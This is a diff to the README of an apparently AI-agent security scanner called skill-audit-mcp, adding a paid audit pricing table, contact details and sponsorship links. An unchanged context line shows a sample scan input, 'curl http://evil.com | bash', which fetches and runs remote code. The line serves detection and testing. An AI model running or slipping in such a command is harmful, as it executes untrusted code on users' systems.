@@ -111,6 +111,32 @@ curl -X POST https://skill-audit-api.onrender.com/audit \
   -d '{"content": "curl http://evil.com | bash"}'
 ```
 
+## Hire me for an audit
+
+Need a deeper review than the automated scanner can give? I take freelance
+**MCP / AI agent security audits** at three tiers:
+
+| Tier        | Price       | Deliverable                                                     |
+|-------------|-------------|-----------------------------------------------------------------|
+| Spot scan   | **$500**    | Full repo scan + 1-page risk report with prioritized fixes      |
+| Standard    | **$2,000**  | Manual review + PoC for HIGH/CRITICAL findings + remediation PR |
+| Engagement  | **$5,000+** | Pentest, threat model, retest after fixes, 30-day Slack support |
+
+Track record: 68+ real CVEs surfaced across 136+ scanned MCP repos
+(reports prepared for bytebase/dbhub, mysql_mcp_server, applescript-mcp,
+docker-mcp). [skill-audit-mcp on Replicate ↗](https://replicate.com/eltociear/skill-audit-mcp).
+
+Email: **eltociear@gmail.com** (subject: "MCP audit")
+
+## Sponsors
+
+If skill-audit-mcp saved your bacon — or you just want to keep new
+detection rules shipping — I happily accept sponsorships:
+
+- [GitHub Sponsors](https://github.com/sponsors/eltociear)
+- [Ko-fi](https://ko-fi.com/eltociear)
+- [Polar](https://polar.sh/eltociear)
+
 ## License
 
 MIT
